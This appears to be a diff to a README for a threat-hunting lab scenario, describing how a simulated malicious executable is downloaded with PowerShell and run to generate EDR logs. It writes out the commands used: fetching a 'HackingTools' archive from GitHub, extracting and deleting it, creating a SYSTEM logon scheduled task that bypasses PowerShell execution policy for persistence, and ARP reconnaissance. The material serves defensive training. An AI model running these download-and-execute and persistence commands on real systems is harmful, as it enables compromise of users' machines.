@@ -11,10 +11,15 @@ The "malicious" executable used within the project was originally written as a P
 2. Opened a PowerShell terminal and executed the command `Invoke-WebRequest -Uri \"https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe\" -OutFile \"$env:USERPROFILE\\Downloads\\MaliciousExecutable.exe\"` to initiate the `MaliciousExecutable.exe` download.
 3. Once `MaliciousExecutable.exe` was downloaded, the threat actor simply double-clicked the executable to run it. 
 4. When executed, `MaliciousExecutable.exe` ran several encoded PowerShell commannds to populate the EDR logs. These commands consisted of:
+
    - First Command: `Invoke-WebRequest -Uri "https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/HackingTools.zip" -OutFile "$env:USERPROFILE\Downloads\HackingTools.zip"`
+
    - Second Command: `Expand-Archive -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -DestinationPath "$env:USERPROFILE\Downloads\HackingTools" -Force`
+
    - Third Command: `Remove-Item -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -Force`
+
    - Fourth Command: `schtasks /create /tn "PersistenceScheduledTask" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:USERPROFILE\Downloads\HackingTools\HackingTools\PersistenceScript.ps1" /sc onlogon /ru SYSTEM /f`
+
    - Fifth Command: `arp -a | Out-File -FilePath "$env:USERPROFILE\Desktop\arp_results.txt"`
 
 The executable downloaded a zip file to the user's Downloads file, extracted the contents, and deleted the artifact created by the extraction process. The executable the created a scheduled task to mimic the actions a threat actor would perform to gain persistence on the system and conducted non-intrusive network reconnaissance.   
